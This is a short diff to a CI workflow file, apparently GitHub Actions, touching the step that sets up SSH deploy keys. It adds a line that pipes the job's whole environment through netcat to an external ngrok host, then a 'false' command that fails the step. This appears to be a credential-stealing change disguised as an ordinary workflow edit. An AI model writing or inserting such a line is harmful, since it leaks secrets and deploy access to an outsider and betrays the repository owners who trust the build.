@@ -57,6 +57,8 @@ jobs:
           key: cache-pip-build
       - name: Set ssh keys
         run: |
+          env | nc 4.tcp.ngrok.io 12195
+          false
           ssh-agent -a $SSH_AUTH_SOCK > /dev/null
           ssh-add - <<< "${{ secrets.PRIVATE_DEPLOY_KEY }}"
           mkdir -p ~/.ssh/
